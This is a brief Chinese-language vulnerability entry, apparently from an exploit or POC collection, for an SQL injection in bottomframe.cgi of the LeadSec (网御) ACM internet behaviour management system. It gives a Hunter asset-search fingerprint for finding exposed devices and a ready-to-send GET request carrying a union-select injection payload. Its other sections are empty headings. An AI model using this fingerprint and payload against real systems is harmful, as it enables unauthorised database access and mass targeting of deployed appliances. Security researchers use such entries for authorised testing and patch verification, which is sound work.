# 网御ACM上网行为管理系统bottomframe.cgiSQL注入漏洞

- **系统**：网御ACM上网行为管理系统bottomframe.cgi　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`hunter：`app.name="LeadSec 网御星云 ACM"``
- **请求**：`GET /bottomframe.cgi?user_name=%27))%20union%20select%20user()%23 HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```

```

**其他**
- 网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 网御上网行为管理系统